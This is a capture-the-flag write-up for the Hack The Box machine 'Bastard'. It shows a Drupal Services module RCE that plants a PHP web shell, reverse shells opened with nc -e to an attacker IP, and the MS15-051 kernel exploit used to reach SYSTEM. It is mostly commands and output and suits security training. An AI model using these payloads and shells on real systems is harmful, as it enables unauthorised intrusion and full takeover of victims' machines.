# Bastard

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.84.254
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-30 04:29 EDT
Nmap scan report for 10.129.84.254
Host is up (0.0072s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown
```

### Drupal

Port 80 was a Drupal Instance:

<figure><img src="../../../.gitbook/assets/image (2139).png" alt=""><figcaption></figcaption></figure>

This box is really old, the intended exploit is to use Drupal Module RCE. Here's the PoC:

{% embed url="https://www.exploit-db.com/exploits/41564" %}

We need to edit the top of the script to have the correct URL and endpoints accordingly:

```php
$url = 'http://10.129.84.254';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'test.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
];
```

Then, we can run the exploit:

```
$ php exploit.php
# Exploit Title: Drupal 7.x Services Module Remote Code Execution
# Vendor Homepage: https://www.drupal.org/project/services
# Exploit Author: Charles FOL
# Contact: https://twitter.com/ambionics 
# Website: https://www.ambionics.io/blog/drupal-services-module-rce


#!/usr/bin/php
Stored session information in session.json
Stored user information in user.json
Cache contains 7 entries
File written: http://10.129.84.254/test.php

$ curl -G --data-urlencode 'cmd=whoami' 'http://10.129.84.254/test.php'
nt authority\iusr
```

We now have RCE, and getting a reverse shell can be done through `nc.exe`.&#x20;

```
$ curl -G --data-urlencode 'cmd=\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444' 'http://10.129.84.254/test.php'
```

<figure><img src="../../../.gitbook/assets/image (2620).png" alt=""><figcaption></figcaption></figure>

Grab the user flag.

## Privilege Escalation --> Kernel

This is a really old machine, so tehre's bound to be some Windows Kernel exploit that we can use.&#x20;

```
C:\Users\dimitris>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          30/4/2023, 11:27:25 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.559 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.578 MB
Virtual Memory: In Use:    517 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.84.254
```

`SeImpersonatePrivilege` is also enabled, making this an easy exploit. For this particular case, we can use MS15-051.&#x20;

{% embed url="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip" %}

When run, we can see that it works:

```
C:\Windows\Tasks>\\10.10.14.2\share\ms15-051x64.exe "whoami" 
\\10.10.14.2\share\ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2268 created.
==============================
NT AUTHORITY\SYSTEM
```

We can run another reverse shell easily:

```
C:\Windows\Tasks>\\10.10.14.2\share\ms15-051x64.exe "\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444"
\\10.10.14.2\share\ms15-051x64.exe "\\10.10.14.2\share\nc64.exe -e cmd.exe 10.10.14.2 4444"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2400 created.
```

<figure><img src="../../../.gitbook/assets/image (1696).png" alt=""><figcaption></figcaption></figure>

Rooted!
